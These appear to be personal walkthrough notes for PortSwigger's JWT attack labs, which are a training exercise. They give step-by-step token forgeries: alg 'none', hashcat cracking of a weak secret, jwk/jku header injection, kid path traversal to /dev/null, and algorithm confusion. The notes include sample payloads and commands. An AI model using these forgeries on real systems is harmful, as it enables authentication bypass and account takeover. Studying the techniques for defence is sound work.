<span style="color:yellow;font-weight:700;font-size:30px">
JWT attacks

</span>
https://portswigger.net/web-security/jwt

# Working with JWTs in Burp Suite
https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite

# ***1. Lab: JWT authentication bypass via unverified signature***
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos. 

in the JWT payload section we find the username value:
```json
{"iss":"portswigger","sub":"**wiener**","exp":1665957120}
```

we can change it to admin and see if it grant us access to the admin panel:
```json
{"iss":"portswigger","sub":"**administrator**","exp":1665957120}

```
send request to **GET /admin/delete?username=carlos HTTP/1.1** and solve lab.

# cool

# ***2. Lab: JWT authentication bypass via flawed signature verification***
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos. 

1. find the alg parameter in the header:
```json
    {"kid":"50671508-357d-411d-b8cc-8ecb0084a2d8","alg":"**RS256**"}  
```
and change its value from "RS256" to "none":
```json
    {"kid":"50671508-357d-411d-b8cc-8ecb0084a2d8","alg":"**none**"} 
``` 

2. find username in payload:
```json
    {"iss":"portswigger","sub":"**wiener**","exp":1665957968}
cahnge it to "administrator":
    {"iss":"portswigger","sub":"**administrator**","exp":1665957968}
```

3. delete the signature.

**Final payload:
    eyJraWQiOiI1MDY3MTUwOC0zNTdkLTQxMWQtYjhjYy04ZWNiMDA4NGEyZDgiLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NjU5NTc5Njh9.

* (note the dot at the end - creates an empty signature part)

send request to **GET /admin/delete?username=carlos HTTP/1.1** and solve lab.

# cool

# ***3. Lab: JWT authentication bypass via weak signing key***
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos. 

1. use hashcat to guess encryption key:

    └─$ hashcat -a 0 -m 16500 eyJraWQiOiIzZmQxZjIxOC0zOWM5LTRlNGUtYjhmNC1jOThmMzliZDg1NjIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2NTk2MDAyNH0.7iHnoY8-6PHfWmJH2w8et74Ru4-VYih7BVvI1ig45wk jwt-secretes.list --show
    
    eyJraWQiOiIzZmQxZjIxOC0zOWM5LTRlNGUtYjhmNC1jOThmMzliZDg1NjIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2NTk2MDAyNH0.7iHnoY8-6PHfWmJH2w8et74Ru4-VYih7BVvI1ig45wk:secret1

key = secret1
base64 = c2VjcmV0MQ==

in JWT tab select new symetric key and generate. replace **k** value with the base64-key:
```json
    {
        "kty": "oct",
        "kid": "6959e654-d9c5-49ed-8105-61bdbb3e0c43",
        "k": "c2VjcmV0MQ"
    }
```

note **==** padding needs to be removed

in the repeater tab we go to the request's **Json web token** tab and choose **sign**. in the window opend we choos the newly created key and press sign (leave all default settings)

send request to **GET /admin/delete?username=carlos HTTP/1.1** and solve lab.

# cool

# ***4. Lab: JWT authentication bypass via jwk header injection***
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos. 

1. generate RSA key in **JWT Editor keys**
2. login and send request with original JWT to repeater and change the address to **GET /admin/delete?username=carlos HTTP/1.1**
3. from the **JSON Web Token** tab in repeater choose **Attack** mode **Embedded JWK**

see lab solved

# cool

# ***5.Lab: JWT authentication bypass via jku header injection***
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection

 To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos. 

 1. login and send request with original JWT to repeater and change the address to **GET /admin/delete?username=carlos HTTP/1.1**
 2. create a new RSA key in JWT tab and **copy public key as JWT**
 3. in exploit server add JSON keys in JWK set format:
 ```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "40e39441-2247-4279-aeea-15c3a63503fb",
            "n": "0O84hjdBhMQeWZoX1KQeIg0XYQMgqKzNRPEz0MLGJ1JJo-wtKxr0QHRzIHAyXffSTIRmzDcnTYs_bgMsSl2ksyaiVmb7eUO-IukFeIRcg8gBkZcWo3SCJaxpmJO8rGXIGr2rz3hukMmSaT7CWeUYbOEzTN78j_jZTdrJlgTYzlup1VCDWJH0XbBgd01V8kfb5LqK7Sl2JjSMK_xANW4xn2Nb6K-J0Uj8M5siCNPNA9tkLOBfYB_18VOIIPva5GEKaB8Urt0mjq4nLumF4N9kQm3e-UksMuBukHTxmoXoLlsJ2SuJFd7jwWJLwyWRXkHxK4UmOAyqkb3B3pd5z-Yk-w"
        }
    ]
}
```

4. copy exploit address and paste it in the JWT header under a **jku** parameter:
```json
    {
        "kid": "daa9801d-b859-4df1-acff-853e09bcabe2",
        "alg": "RS256",
        "jku": "https://exploit-0a7a003704ab7b23c1fb7306012500fd.exploit-server.net/exploit"
    }
```
(important to remeber to add the apos. for a valid json)

5. change the **sub** parameter in the payload to **administrator** 
6. sign with the key we created in step 2 and send request

observe lab solved

# cool


# ***6. Lab: JWT authentication bypass via kid header path traversal***
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos. 

hint:
 You could theoretically do this with any file, but one of the simplest methods is to use /dev/null, which is present on most Linux systems. As this is an empty file, fetching it returns null. Therefore, signing the token with a Base64-encoded null byte will result in a valid signature.  


1. login and send request with original JWT to repeater and change the address to **GET /admin/delete?username=carlos HTTP/1.1**
2. create a new RSA key in JWT tab and change the **k** parameter into **AA==** (null byte in base64)
<!-- * not sure why padding here works while padding in lab 3 didnt -->
3. change **kid** parameter to a pooint to a path:
 ```json
   {
        "kid": "../../../../dev/null",
        "alg": "HS256"
    }
```

(since */dev/null* is an empty file it will always yeild *NULL*)

4. change the **sub** parameter in the payload to **administrator** 
5. sign with the key we created in step 2 and send request

observe lab solved

# cool

<span style="color:yellow;font-weight:700;font-size:30px">
Algorithm confusion attacks
</span>
https://portswigger.net/web-security/jwt/algorithm-confusion#symmetric-vs-asymmetric-algorithms

# ***1. Lab: JWT authentication bypass via algorithm confusion***
https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion

To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos

Hint:You can assume that the server stores its public key as an X.509 PEM file.

1. login and send request with original JWT to repeater and change the address to **GET /admin/delete?username=carlos HTTP/1.1**
2. find bulic key in a well known address: **/jwks.json**

request: 
    **GET /jwks.json HTTP/1.1**

response:
```json
    {"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"38f81b63-db73-4d9b-983a-3852611a5cdd","alg":"RS256","n":"oiu3AJ7aWF_WM2lUN5O6rr5VqcYLy6nk6ZLF8HFVJvW9yg5CFkLqgRhwPKyWOs_LjsEiaFty3YS-xoYMXvKxJymYmwZcPC0D9zAZkdZlYmzBW88YNleYlgmyjHU4gdJmvvA-Owci6chaj2mIxeY8SDahhPqaERftfIJlqsh2pp7wWoNaVk4Ea44Agwq5xXx22NMVQpT48_xwrMaMQoy7jVbQ3njMNZcmYgYdCoy7nKnR80eEFYq_CKctoUgbQFYELTY7FCyZnpbSuBI_MnYzLaDEubV8xdCjEePjRhKLtWvERZ2uqLZrW8OSCMxRiDx9LrQQE8OuqQHvXfm9k42B6w"}]}
```
copy the key (without the *{"keys":[]}*). in **JWK editor** select **new RSA** and paste it inside and press ok. with right click **copy public key as PEM**:
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoiu3AJ7aWF/WM2lUN5O6
    rr5VqcYLy6nk6ZLF8HFVJvW9yg5CFkLqgRhwPKyWOs/LjsEiaFty3YS+xoYMXvKx
    JymYmwZcPC0D9zAZkdZlYmzBW88YNleYlgmyjHU4gdJmvvA+Owci6chaj2mIxeY8
    SDahhPqaERftfIJlqsh2pp7wWoNaVk4Ea44Agwq5xXx22NMVQpT48/xwrMaMQoy7
    jVbQ3njMNZcmYgYdCoy7nKnR80eEFYq/CKctoUgbQFYELTY7FCyZnpbSuBI/MnYz
    LaDEubV8xdCjEePjRhKLtWvERZ2uqLZrW8OSCMxRiDx9LrQQE8OuqQHvXfm9k42B
    6wIDAQAB
    -----END PUBLIC KEY-----

in encoder paste the key and base64 it. copy the **base64-PEM key**:
```base64
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvaXUzQUo3YVdGL1dNMmxVTjVPNgpycjVWcWNZTHk2bms2WkxGOEhGVkp2Vzl5ZzVDRmtMcWdSaHdQS3lXT3MvTGpzRWlhRnR5M1lTK3hvWU1Ydkt4Ckp5bVltd1pjUEMwRDl6QVprZFpsWW16Qlc4OFlObGVZbGdteWpIVTRnZEptdnZBK093Y2k2Y2hhajJtSXhlWTgKU0RhaGhQcWFFUmZ0ZklKbHFzaDJwcDd3V29OYVZrNEVhNDRBZ3dxNXhYeDIyTk1WUXBUNDgveHdyTWFNUW95NwpqVmJRM25qTU5aY21ZZ1lkQ295N25LblI4MGVFRllxL0NLY3RvVWdiUUZZRUxUWTdGQ3labnBiU3VCSS9Nbll6CkxhREV1YlY4eGRDakVlUGpSaEtMdFd2RVJaMnVxTFpyVzhPU0NNeFJpRHg5THJRUUU4T3VxUUh2WGZtOWs0MkIKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

in **JWK editor** Generate a new **symetric** key and replace **k** value with the **base64-PEM key**: 
```json
{
    "kty": "oct",
    "kid": "fd5dc0d8-6ada-4dbb-936b-4caa067070b3",
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvaXUzQUo3YVdGL1dNMmxVTjVPNgpycjVWcWNZTHk2bms2WkxGOEhGVkp2Vzl5ZzVDRmtMcWdSaHdQS3lXT3MvTGpzRWlhRnR5M1lTK3hvWU1Ydkt4Ckp5bVltd1pjUEMwRDl6QVprZFpsWW16Qlc4OFlObGVZbGdteWpIVTRnZEptdnZBK093Y2k2Y2hhajJtSXhlWTgKU0RhaGhQcWFFUmZ0ZklKbHFzaDJwcDd3V29OYVZrNEVhNDRBZ3dxNXhYeDIyTk1WUXBUNDgveHdyTWFNUW95NwpqVmJRM25qTU5aY21ZZ1lkQ295N25LblI4MGVFRllxL0NLY3RvVWdiUUZZRUxUWTdGQ3labnBiU3VCSS9Nbll6CkxhREV1YlY4eGRDakVlUGpSaEtMdFd2RVJaMnVxTFpyVzhPU0NNeFJpRHg5THJRUUU4T3VxUUh2WGZtOWs0MkIKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
}
```
change **sub** value to *administrator* and **alg** value to *HS256* and send request. observe lab solved banner.

# Solved


# ***2. Lab: JWT authentication bypass via algorithm confusion with no exposed key***
https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key

To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos. 



hint: in linux run docker:
    docker run --rm -it portswigger/sig2n <token1> <token2> 